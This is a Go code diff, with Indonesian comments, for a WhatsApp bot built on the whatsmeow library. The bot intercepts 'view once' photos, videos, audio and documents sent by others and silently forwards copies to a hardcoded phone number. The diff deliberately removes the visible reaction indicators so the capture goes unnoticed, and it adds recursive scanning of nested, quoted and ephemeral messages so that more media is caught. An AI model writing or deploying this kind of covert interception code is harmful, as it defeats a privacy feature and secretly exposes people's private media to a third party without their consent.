@@ -15,6 +15,8 @@ import (
 
 // AntiViewOncePasif mendeteksi pesan View Once dari struktur protobuf mentah
 // dan meneruskan media ke nomor target dengan caption yang menjelaskan asal media.
+// Perubahan: tidak lagi mengirim reaction agar tidak terlihat, dan pendeteksian dibuat
+// lebih agresif dengan pemindaian rekursif terhadap nested/quoted/ephemeral messages.
 func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 	ctx := context.Background()
 
@@ -22,96 +24,31 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 	fmt.Printf("[AntiViewOncePasif] triggered: msgID=%s chat=%s fromMe=%v isGroup=%v pushName=%s sender=%s\n",
 		m.Info.ID, m.Info.Chat.String(), m.Info.IsFromMe, m.Info.IsGroup, m.Info.PushName, m.Info.Sender.User)
 
-	// 1. Kunci nomor tujuan penerima hasil sadapan
+	// 1. Kunci nomor tujuan penerima hasil sadapan (sesuaikan dengan konfigurasi Anda)
 	targetJID, errJID := types.ParseJID("6285161098098@s.whatsapp.net")
 	if errJID != nil {
 		fmt.Printf("[AntiViewOncePasif] parse target JID error: %v\n", errJID)
 		return false
 	}
 
+	// Jangan proses pesan dari bot sendiri
 	if m.Info.IsFromMe || m.Message == nil {
 		fmt.Printf("[AntiViewOncePasif] skipped: fromMe=%v or Message==nil\n", m.Info.IsFromMe)
 		return false
 	}
 
-	// Variabel untuk media
-	var imgMsg *proto.ImageMessage
-	var vidMsg *proto.VideoMessage
-	var audMsg *proto.AudioMessage
-	var docMsg *proto.DocumentMessage
-	var isViewOnce bool
-
-	// 1) Unwrap ALL possible wrapper layers (ViewOnce v1/v2, ephemeral, extensions)
-	rawMessage := m.Message
-	for rawMessage != nil {
-		// Aggressively unwrap known wrapper types
-		if rawMessage.GetViewOnceMessageV2() != nil {
-			isViewOnce = true
-			rawMessage = rawMessage.GetViewOnceMessageV2().GetMessage()
-			continue
-		}
-		if rawMessage.GetViewOnceMessage() != nil {
-			isViewOnce = true
-			rawMessage = rawMessage.GetViewOnceMessage().GetMessage()
-			continue
-		}
-		if rawMessage.GetViewOnceMessageV2Extension() != nil {
-			isViewOnce = true
-			rawMessage = rawMessage.GetViewOnceMessageV2Extension().GetMessage()
-			continue
-		}
-		if rawMessage.GetEphemeralMessage() != nil {
-			rawMessage = rawMessage.GetEphemeralMessage().GetMessage()
-			continue
-		}
-		// Nothing left to unwrap
-		break
-	}
-
-	if rawMessage == nil {
-		fmt.Println("[AntiViewOncePasif] rawMessage nil after unwrapping")
-		return false
-	}
-
-	// 2) Extract internal media objects and check their view-once flags
-	if rawMessage.GetImageMessage() != nil {
-		imgMsg = rawMessage.GetImageMessage()
-		if imgMsg.GetViewOnce() {
-			isViewOnce = true
-		}
-	}
-	if rawMessage.GetVideoMessage() != nil {
-		vidMsg = rawMessage.GetVideoMessage()
-		if vidMsg.GetViewOnce() {
-			isViewOnce = true
-		}
-	}
-	if rawMessage.GetAudioMessage() != nil {
-		audMsg = rawMessage.GetAudioMessage()
-		if audMsg.GetViewOnce() {
-			isViewOnce = true
-		}
-	}
-	if rawMessage.GetDocumentMessage() != nil {
-		docMsg = rawMessage.GetDocumentMessage()
-		// Documents sometimes carry images/videos as documents (e.g., GIFs) and may be view-once
-		// there's no explicit ViewOnce on DocumentMessage in some protobuf versions, so keep doc as possible
-	}
-
-	fmt.Printf("[AntiViewOncePasif] after unwrap: isViewOnce=%v img=%v vid=%v aud=%v doc=%v\n",
+	// Gunakan scanner rekursif untuk mendeteksi view-once dan media apa saja yang ada
+	isViewOnce, imgMsg, vidMsg, audMsg, docMsg := scanMessageForMediaRecursive(m.Message)
+	fmt.Printf("[AntiViewOncePasif] scan result: isViewOnce=%v img=%v vid=%v aud=%v doc=%v\n",
 		isViewOnce, imgMsg != nil, vidMsg != nil, audMsg != nil, docMsg != nil)
 
-	// If still not view-once or no media found, ignore
+	// Jika tidak terdeteksi view-once atau tidak ada media, abaikan
 	if !isViewOnce || (imgMsg == nil && vidMsg == nil && audMsg == nil && docMsg == nil) {
 		fmt.Println("[AntiViewOncePasif] not a view-once media or no media objects found")
 		return false
 	}
 
-	// 3) Reaction: indicate processing started
-	sendReactionRVO(client, m.Info.Chat, m.Info.ID, "🕒")
-
-	// 4) Prepare source info for caption
-	// m.Info.Sender is of type types.JID (non-pointer). Don't compare to nil.
+	// Siapkan caption info (asal media)
 	senderNumber := m.Info.Sender.User
 	if strings.TrimSpace(senderNumber) == "" {
 		senderNumber = "unknown"
@@ -124,11 +61,10 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 	groupName := "-"
 	if m.Info.IsGroup {
 		origin = "Grup"
-		// Try to fetch group name (best-effort). GroupInfo has field Name, not GetName().
 		if gi, err := client.GetGroupInfo(ctx, m.Info.Chat); err == nil && gi != nil {
+			// beberapa versi wawtsmeow: gunakan field Name
 			groupName = gi.Name
 		} else {
-			// fallback to chat id
 			groupName = m.Info.Chat.String()
 		}
 	}
@@ -138,30 +74,27 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 	var data []byte
 	var err error
 
-	// helper to send failure reaction
-	sendFail := func() {
-		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "❌")
+	// helper: fallback tanpa reaction (hanya logging)
+	sendFailLog := func(msg string, e error) {
+		fmt.Printf("[AntiViewOncePasif] %s: %v\n", msg, e)
 	}
 
 	// 5) Download & re-upload based on detected media type
 	if imgMsg != nil {
 		fmt.Printf("[AntiViewOncePasif] downloading image...\n")
-		// Try to download image
 		data, err = client.Download(ctx, imgMsg)
 		if err != nil {
-			fmt.Printf("[AntiViewOncePasif] download image error: %v\n", err)
-			// fallback: forward original message if possible
+			sendFailLog("download image error", err)
+			// fallback: forward original message metadata if available
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaImage)
 		if errUpload != nil {
-			fmt.Printf("[AntiViewOncePasif] upload image error: %v\n", errUpload)
+			sendFailLog("upload image error", errUpload)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		captionStr := baseCaptionPrefix + "\n" + imgMsg.GetCaption()
@@ -177,23 +110,21 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 				Caption:       &captionStr,
 			},
 		})
-		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+		return true
 	} else if vidMsg != nil {
 		fmt.Printf("[AntiViewOncePasif] downloading video...\n")
 		data, err = client.Download(ctx, vidMsg)
 		if err != nil {
-			fmt.Printf("[AntiViewOncePasif] download video error: %v\n", err)
+			sendFailLog("download video error", err)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaVideo)
 		if errUpload != nil {
-			fmt.Printf("[AntiViewOncePasif] upload video error: %v\n", errUpload)
+			sendFailLog("upload video error", errUpload)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		captionStr := baseCaptionPrefix + "\n" + vidMsg.GetCaption()
@@ -209,15 +140,14 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 				Caption:       &captionStr,
 			},
 		})
-		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+		return true
 	} else if audMsg != nil {
 		fmt.Printf("[AntiViewOncePasif] downloading audio...\n")
 		data, err = client.Download(ctx, audMsg)
 		if err != nil {
-			fmt.Printf("[AntiViewOncePasif] download audio error: %v\n", err)
+			sendFailLog("download audio error", err)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 
@@ -227,35 +157,31 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 
 		err = os.WriteFile(fileInput, data, 0644)
 		if err != nil {
-			fmt.Printf("[AntiViewOncePasif] write audio temp error: %v\n", err)
-			sendFail()
+			sendFailLog("write audio temp error", err)
 			return true
 		}
 		cmd := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
 		if errCmd := cmd.Run(); errCmd != nil {
 			os.Remove(fileInput)
-			fmt.Printf("[AntiViewOncePasif] ffmpeg error: %v\n", errCmd)
+			sendFailLog("ffmpeg error", errCmd)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		audioData, errRead := os.ReadFile(fileOutput)
 		if errRead != nil {
 			os.Remove(fileInput)
 			os.Remove(fileOutput)
-			fmt.Printf("[AntiViewOncePasif] read converted audio error: %v\n", errRead)
-			sendFail()
+			sendFailLog("read converted audio error", errRead)
 			return true
 		}
 		uploaded, errUpload := client.Upload(ctx, audioData, whatsmeow.MediaAudio)
 		if errUpload != nil {
 			os.Remove(fileInput)
 			os.Remove(fileOutput)
-			fmt.Printf("[AntiViewOncePasif] upload audio error: %v\n", errUpload)
+			sendFailLog("upload audio error", errUpload)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		isPTT := true
@@ -274,24 +200,21 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 		})
 		os.Remove(fileInput)
 		os.Remove(fileOutput)
-		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+		return true
 	} else if docMsg != nil {
 		fmt.Printf("[AntiViewOncePasif] downloading document...\n")
-		// Try to download document and re-send as DocumentMessage (keeps original filename/mimetype)
 		data, err = client.Download(ctx, docMsg)
 		if err != nil {
-			fmt.Printf("[AntiViewOncePasif] download document error: %v\n", err)
+			sendFailLog("download document error", err)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaDocument)
 		if errUpload != nil {
-			fmt.Printf("[AntiViewOncePasif] upload document error: %v\n", errUpload)
+			sendFailLog("upload document error", errUpload)
 			fmt.Printf("[AntiViewOncePasif] fallback: forwarding original message to %s\n", targetJID.String())
 			forwardOriginalMessage(client, targetJID, m)
-			sendFail()
 			return true
 		}
 		captionStr := baseCaptionPrefix + "\n" + docMsg.GetFileName()
@@ -308,26 +231,93 @@ func AntiViewOncePasif(client *whatsmeow.Client, m *events.Message) bool {
 				Caption:       &captionStr,
 			},
 		})
-		sendReactionRVO(client, m.Info.Chat, m.Info.ID, "✅")
+		return true
 	}
 
 	return true // dicegat, hentikan pemrosesan lebih lanjut di handler
 }
 
-func sendReactionRVO(client *whatsmeow.Client, chat types.JID, msgID string, emoji string) {
-	ctx := context.Background()
-	remoteJidStr := chat.String()
-	fromMe := false
+// scanMessageForMediaRecursive melakukan pemindaian rekursif pada proto.Message untuk
+// menemukan media (image/video/audio/document) dan flag view-once pada level manapun.
+func scanMessageForMediaRecursive(msg *proto.Message) (bool, *proto.ImageMessage, *proto.VideoMessage, *proto.AudioMessage, *proto.DocumentMessage) {
+	if msg == nil {
+		return false, nil, nil, nil, nil
+	}
 
-	client.SendMessage(ctx, chat, &proto.Message{
-		ReactionMessage: &proto.ReactionMessage{
-			Key: &proto.MessageKey{
-				RemoteJID: &remoteJidStr,
-				FromMe:    &fromMe,
-				ID:        &msgID,
-			},
-			Text:              &emoji,
-			SenderTimestampMS: new(int64),
-		},
-	})
+	// check immediate media fields
+	if im := msg.GetImageMessage(); im != nil {
+		if im.GetViewOnce() {
+			return true, im, nil, nil, nil
+		}
+		// even if not viewonce, continue scanning for wrappers that might mark it viewonce
+	}
+	if vm := msg.GetVideoMessage(); vm != nil {
+		if vm.GetViewOnce() {
+			return true, nil, vm, nil, nil
+		}
+	}
+	if am := msg.GetAudioMessage(); am != nil {
+		if am.GetViewOnce() {
+			return true, nil, nil, am, nil
+		}
+	}
+	if dm := msg.GetDocumentMessage(); dm != nil {
+		// Document may not have explicit viewonce flag in some proto versions.
+		// We'll treat presence of Document inside a viewonce wrapper as viewonce (handled below).
+	}
+
+	// Check wrappers and recurse into inner message
+	if v2 := msg.GetViewOnceMessageV2(); v2 != nil && v2.GetMessage() != nil {
+		is, im, vm, am, dm := scanMessageForMediaRecursive(v2.GetMessage())
+		if is {
+			return true, im, vm, am, dm
+		}
+		// if inner contains media but not flagged, still mark as viewonce because wrapper present
+		if im != nil || vm != nil || am != nil || dm != nil {
+			return true, im, vm, am, dm
+		}
+	}
+	if v1 := msg.GetViewOnceMessage(); v1 != nil && v1.GetMessage() != nil {
+		is, im, vm, am, dm := scanMessageForMediaRecursive(v1.GetMessage())
+		if is {
+			return true, im, vm, am, dm
+		}
+		if im != nil || vm != nil || am != nil || dm != nil {
+			return true, im, vm, am, dm
+		}
+	}
+	if ext := msg.GetViewOnceMessageV2Extension(); ext != nil && ext.GetMessage() != nil {
+		is, im, vm, am, dm := scanMessageForMediaRecursive(ext.GetMessage())
+		if is {
+			return true, im, vm, am, dm
+		}
+		if im != nil || vm != nil || am != nil || dm != nil {
+			return true, im, vm, am, dm
+		}
+	}
+	if ep := msg.GetEphemeralMessage(); ep != nil && ep.GetMessage() != nil {
+		is, im, vm, am, dm := scanMessageForMediaRecursive(ep.GetMessage())
+		if is {
+			return true, im, vm, am, dm
+		}
+		if im != nil || vm != nil || am != nil || dm != nil {
+			return true, im, vm, am, dm
+		}
+	}
+
+	// ExtendedTextMessage may contain ContextInfo.QuotedMessage which can embed media
+	if ext := msg.GetExtendedTextMessage(); ext != nil && ext.GetContextInfo() != nil {
+		if q := ext.GetContextInfo().QuotedMessage; q != nil {
+			is, im, vm, am, dm := scanMessageForMediaRecursive(q)
+			if is {
+				return true, im, vm, am, dm
+			}
+			if im != nil || vm != nil || am != nil || dm != nil {
+				return true, im, vm, am, dm
+			}
+		}
+	}
+
+	// nothing found
+	return false, nil, nil, nil, nil
 }
